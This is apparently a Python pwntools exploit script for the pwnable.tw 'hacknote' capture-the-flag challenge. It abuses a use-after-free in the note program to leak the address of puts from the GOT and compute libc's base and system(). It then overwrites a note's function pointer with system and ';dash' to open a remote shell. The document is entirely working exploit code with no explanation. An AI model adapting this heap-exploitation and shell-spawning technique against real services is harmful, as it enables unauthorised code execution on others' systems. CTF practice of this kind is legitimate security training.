from pwn import *
#context.log_level = "debug"

#HOST = "localhost"
HOST = "chall.pwnable.tw"
#PORT = 4444
PORT = 10102

s = remote(HOST, PORT)

elf = ELF("./hacknote")
#libc = ELF("./libc-2.27.so")
libc = ELF("./libc_32.so.6")
pause()

puts_next = 0x0804862b
puts_got = elf.got["puts"]
puts_off = libc.symbols["puts"]
system_off = libc.symbols["system"]

def func_add(size, content):
	s.recvuntil("Your choice :")
	s.sendline("1")
	s.recvuntil("Note size :")
	s.send(str(size))
	s.recvuntil("Content :")
	s.send(content)

def func_delete(index):
	s.recvuntil("Your choice :")
	s.sendline("2")
	s.recvuntil("Index :")
	s.send(str(index))

def func_print(index):
	s.recvuntil("Your choice :")
	s.sendline("3")
	s.recvuntil("Index :")
	s.send(str(index))

func_add(16, "A")
func_add(16, "B")
func_delete(0)
func_delete(1)

payload = p32(puts_next)
payload += p32(puts_got)

func_add(8, payload)
func_print(0)
real_puts = u32(s.recv(4))

real_base = real_puts - puts_off
real_system = real_base + system_off

print "[*] real_base : " + hex(real_base)
print "[*] real_puts : " + hex(real_puts)
print "[*] real_system : " + hex(real_system)

payload = p32(real_system)
payload += ";dash"

func_delete(2)
func_add(12, payload)
func_print(0)

s.interactive()